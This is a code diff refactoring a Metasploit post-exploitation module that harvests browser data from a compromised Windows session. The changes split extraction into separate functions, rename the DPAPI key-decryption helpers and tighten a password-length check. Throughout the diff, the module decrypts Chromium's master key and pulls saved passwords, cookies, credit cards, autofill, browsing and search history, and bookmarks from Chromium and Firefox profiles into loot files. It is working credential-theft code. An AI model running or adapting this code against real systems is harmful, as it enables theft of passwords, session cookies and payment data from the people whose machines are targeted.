@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Post
         'Author' => ['Alexander "xaitax" Hagenah'],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
-          'Reliability' => [REPEATABLE_SESSION],
+          'Reliability' => [],
           'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
         }
       )
@@ -100,7 +100,7 @@ class MetasploitModule < Msf::Post
       kill_browser_process(name) if datastore['KILL_BROWSER']
 
       local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
-      encryption_key = get_encryption_key(local_state)
+      encryption_key = get_chromium_encryption_key(local_state)
       extract_chromium_data(profile_path, encryption_key, name)
     end
   end
@@ -186,7 +186,7 @@ class MetasploitModule < Msf::Post
     sleep(5)
   end
 
-  def decrypt_data(encrypted_data)
+  def decrypt_chromium_data(encrypted_data)
     print_status('Starting DPAPI decryption process.') if datastore['VERBOSE']
     begin
       mem = session.railgun.kernel32.LocalAlloc(0, encrypted_data.length)['return']
@@ -219,7 +219,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def get_encryption_key(local_state_path)
+  def get_chromium_encryption_key(local_state_path)
     print_status("Getting encryption key from: #{local_state_path}") if datastore['VERBOSE']
     if file?(local_state_path)
       local_state = read_file(local_state_path)
@@ -246,7 +246,7 @@ class MetasploitModule < Msf::Post
         end
 
         print_status("Encrypted key (Base64-decoded, hex): #{encrypted_key_bin.unpack('H*').first}") if datastore['VERBOSE']
-        decrypted_key = decrypt_data(encrypted_key_bin)
+        decrypted_key = decrypt_chromium_data(encrypted_key_bin)
 
         if decrypted_key.nil? || decrypted_key.length != 32
           print_error("Decrypted key is not 32 bytes: #{decrypted_key.nil? ? 'nil' : decrypted_key.length} bytes") if datastore['VERBOSE']
@@ -277,7 +277,10 @@ class MetasploitModule < Msf::Post
       return nil
     end
 
-    return print_error('Invalid encrypted password length.') if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE)
+    if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE + 3)
+      print_error('Invalid encrypted password length.')
+      return nil
+    end
 
     iv = encrypted_password[3, IV_SIZE]
     ciphertext = encrypted_password[IV_SIZE + 3...-TAG_SIZE]
@@ -305,13 +308,26 @@ class MetasploitModule < Msf::Post
   def extract_chromium_data(profile_path, encryption_key, browser)
     return print_error("Profile path #{profile_path} not found.") unless directory?(profile_path)
 
+    process_chromium_logins(profile_path, encryption_key, browser)
+    process_chromium_cookies(profile_path, encryption_key, browser)
+    process_chromium_credit_cards(profile_path, encryption_key, browser)
+    process_chromium_download_history(profile_path, browser)
+    process_chromium_autofill_data(profile_path, browser)
+    process_chromium_keyword_search_history(profile_path, browser)
+    process_chromium_browsing_history(profile_path, browser)
+    process_chromium_bookmarks(profile_path, browser)
+  end
+
+  def process_chromium_logins(profile_path, encryption_key, browser)
     login_data_path = "#{profile_path}\\Login Data"
     if file?(login_data_path)
       extract_sql_data(login_data_path, 'SELECT origin_url, username_value, password_value FROM logins', 'Passwords', browser, encryption_key)
     elsif datastore['VERBOSE']
       print_error("Passwords not found at #{login_data_path}")
     end
+  end
 
+  def process_chromium_cookies(profile_path, encryption_key, browser)
     cookies_path = "#{profile_path}\\Network\\Cookies"
     if file?(cookies_path)
       begin
@@ -326,125 +342,157 @@ class MetasploitModule < Msf::Post
     elsif datastore['VERBOSE']
       print_error("Cookies not found at #{cookies_path}")
     end
+  end
 
+  def process_chromium_credit_cards(profile_path, encryption_key, browser)
     credit_card_data_path = "#{profile_path}\\Web Data"
     if file?(credit_card_data_path)
       extract_sql_data(credit_card_data_path, 'SELECT * FROM credit_cards', 'Credit Cards', browser, encryption_key)
     elsif datastore['VERBOSE']
       print_error("Credit Cards not found at #{credit_card_data_path}")
     end
+  end
 
+  def process_chromium_download_history(profile_path, browser)
     download_history_path = "#{profile_path}\\History"
     if file?(download_history_path)
       extract_sql_data(download_history_path, 'SELECT * FROM downloads', 'Download History', browser)
     elsif datastore['VERBOSE']
       print_error("Download History not found at #{download_history_path}")
     end
+  end
 
+  def process_chromium_autofill_data(profile_path, browser)
     autofill_data_path = "#{profile_path}\\Web Data"
     if file?(autofill_data_path)
       extract_sql_data(autofill_data_path, 'SELECT * FROM autofill', 'Autofill Data', browser)
     elsif datastore['VERBOSE']
       print_error("Autofill data not found at #{autofill_data_path}")
     end
+  end
 
+  def process_chromium_keyword_search_history(profile_path, browser)
     keyword_search_history_path = "#{profile_path}\\History"
     if file?(keyword_search_history_path)
       extract_sql_data(keyword_search_history_path, 'SELECT term FROM keyword_search_terms', 'Keyword Search History', browser)
     elsif datastore['VERBOSE']
       print_error("Keyword Search History not found at #{keyword_search_history_path}")
     end
+  end
 
+  def process_chromium_browsing_history(profile_path, browser)
     browsing_history_path = "#{profile_path}\\History"
     if file?(browsing_history_path)
       extract_sql_data(browsing_history_path, 'SELECT url, title, visit_count, last_visit_time FROM urls', 'Browsing History', browser)
     elsif datastore['VERBOSE']
       print_error("Browsing History not found at #{browsing_history_path}")
     end
+  end
 
+  def process_chromium_bookmarks(profile_path, browser)
     bookmarks_path = "#{profile_path}\\Bookmarks"
-    extract_json_bookmarks(bookmarks_path, 'Bookmarks', browser) if file?(bookmarks_path)
+    return unless file?(bookmarks_path)
+
+    bookmarks_data = read_file(bookmarks_path)
+    bookmarks_json = JSON.parse(bookmarks_data)
+
+    bookmarks = []
+    if bookmarks_json['roots']['bookmark_bar']
+      traverse_and_collect_bookmarks(bookmarks_json['roots']['bookmark_bar'], bookmarks)
+    end
+    if bookmarks_json['roots']['other']
+      traverse_and_collect_bookmarks(bookmarks_json['roots']['other'], bookmarks)
+    end
+
+    browser_clean = browser.gsub('\\', '_').chomp('_')
+    timestamp = Time.now.strftime('%Y%m%d%H%M')
+    ip = session.sock.peerhost
+
+    if bookmarks.any?
+      bookmark_entries = bookmarks.map { |bookmark| "#{bookmark[:name]}: #{bookmark[:url]}" }.join("\n")
+      file_name = store_loot("#{browser_clean}_Bookmarks", 'text/plain', session, bookmark_entries, "#{timestamp}_#{ip}_#{browser_clean}_Bookmarks.txt", "#{browser_clean} Bookmarks")
+      file_size = ::File.size(file_name)
+      print_good("└ Extracted Bookmarks to #{file_name} (#{file_size} bytes)")
+    end
+  end
+
+  def traverse_and_collect_bookmarks(bookmark_node, bookmarks)
+    if bookmark_node['children']
+      bookmark_node['children'].each do |child|
+        if child['type'] == 'url'
+          bookmarks << { name: child['name'], url: child['url'] }
+        elsif child['type'] == 'folder' && child['children']
+          traverse_and_collect_bookmarks(child, bookmarks)
+        end
+      end
+    end
   end
 
   def extract_gecko_data(profile_path, browser)
-    logins_path = "#{profile_path}\\logins.json"
-    if file?(logins_path)
-      extract_json_data(logins_path, 'Passwords', browser)
-    elsif datastore['VERBOSE']
-      print_error("Passwords not found at #{logins_path}")
-    end
+    process_gecko_logins(profile_path, browser)
+    process_gecko_cookies(profile_path, browser)
+    process_gecko_download_history(profile_path, browser)
+    process_gecko_keyword_search_history(profile_path, browser)
+    process_gecko_browsing_history(profile_path, browser)
+    process_gecko_bookmarks(profile_path, browser)
+  end
 
+  def process_gecko_logins(profile_path, browser)
+    logins_path = "#{profile_path}\\logins.json"
+    return unless file?(logins_path)
+
+    json_data = read_file(logins_path)
+    browser_clean = browser.gsub('\\', '_').chomp('_')
+    timestamp = Time.now.strftime('%Y%m%d%H%M')
+    ip = session.sock.peerhost
+    file_name = store_loot("#{browser_clean}_Passwords", 'application/json', session, json_data, "#{timestamp}_#{ip}_#{browser_clean}_Passwords.json", "#{browser_clean} Passwords")
+    file_size = ::File.size(file_name)
+
+    print_good("└ Extracted Passwords to #{file_name} (#{file_size} bytes)") if file_size > 2
+  end
+
+  def process_gecko_cookies(profile_path, browser)
     cookies_path = "#{profile_path}\\cookies.sqlite"
     if file?(cookies_path)
       extract_sql_data(cookies_path, 'SELECT host, name, path, value, expiry FROM moz_cookies', 'Cookies', browser)
     elsif datastore['VERBOSE']
       print_error("Cookies not found at #{cookies_path}")
     end
+  end
 
+  def process_gecko_download_history(profile_path, browser)
     download_history_path = "#{profile_path}\\places.sqlite"
     if file?(download_history_path)
       extract_sql_data(download_history_path, 'SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id', 'Download History', browser)
     elsif datastore['VERBOSE']
       print_error("Download History not found at #{download_history_path}")
     end
+  end
 
+  def process_gecko_keyword_search_history(profile_path, browser)
     keyword_search_history_path = "#{profile_path}\\formhistory.sqlite"
     if file?(keyword_search_history_path)
       extract_sql_data(keyword_search_history_path, 'SELECT value FROM moz_formhistory', 'Keyword Search History', browser)
     elsif datastore['VERBOSE']
       print_error("Keyword Search History not found at #{keyword_search_history_path}")
     end
+  end
 
+  def process_gecko_browsing_history(profile_path, browser)
     browsing_history_path = "#{profile_path}\\places.sqlite"
     if file?(browsing_history_path)
       extract_sql_data(browsing_history_path, 'SELECT url, title, visit_count, last_visit_date FROM moz_places', 'Browsing History', browser)
     elsif datastore['VERBOSE']
       print_error("Browsing History not found at #{browsing_history_path}")
     end
+  end
 
+  def process_gecko_bookmarks(profile_path, browser)
     bookmarks_path = "#{profile_path}\\places.sqlite"
     if file?(bookmarks_path)
       extract_sql_data(bookmarks_path, 'SELECT moz_bookmarks.title AS title, moz_places.url AS url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id', 'Bookmarks', browser)
     elsif datastore['VERBOSE']
       print_error("Bookmarks not found at #{bookmarks_path}")
-    end
-  end
-
-  def extract_json_bookmarks(bookmarks_path, data_type, browser)
-    if file?(bookmarks_path)
-      bookmarks_data = read_file(bookmarks_path)
-      bookmarks_json = JSON.parse(bookmarks_data)
-
-      bookmarks = []
-      if bookmarks_json['roots']['bookmark_bar']
-        traverse_bookmarks(bookmarks_json['roots']['bookmark_bar'], bookmarks)
-      end
-      if bookmarks_json['roots']['other']
-        traverse_bookmarks(bookmarks_json['roots']['other'], bookmarks)
-      end
-
-      browser_clean = browser.gsub('\\', '_').chomp('_')
-      timestamp = Time.now.strftime('%Y%m%d%H%M')
-      ip = session.sock.peerhost
-
-      if bookmarks.any?
-        bookmark_entries = bookmarks.map { |bookmark| "#{bookmark[:name]}: #{bookmark[:url]}" }.join("\n")
-        file_name = store_loot("#{browser_clean}_#{data_type}", 'text/plain', session, bookmark_entries, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.txt", "#{browser_clean} #{data_type.capitalize}")
-        file_size = ::File.size(file_name)
-        print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
-      end
-    end
-  end
-
-  def traverse_bookmarks(bookmark_node, bookmarks)
-    if bookmark_node['children']
-      bookmark_node['children'].each do |child|
-        if child['type'] == 'url'
-          bookmarks << { name: child['name'], url: child['url'] }
-        elsif child['type'] == 'folder' && child['children']
-          traverse_bookmarks(child, bookmarks)
-        end
-      end
     end
   end
 
@@ -482,21 +530,6 @@ class MetasploitModule < Msf::Post
         db.close
         ::File.delete(db_local_path) if ::File.exist?(db_local_path)
       end
-    end
-  end
-
-  def extract_json_data(json_path, data_type, browser)
-    return unless file?(json_path)
-
-    json_data = read_file(json_path)
-    browser_clean = browser.gsub('\\', '_').chomp('_')
-    timestamp = Time.now.strftime('%Y%m%d%H%M')
-    ip = session.sock.peerhost
-    file_name = store_loot("#{browser_clean}_#{data_type}", 'application/json', session, json_data, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.json", "#{browser_clean} #{data_type.capitalize}")
-    file_size = ::File.size(file_name)
-
-    if file_size > 2
-      print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
     end
   end
 
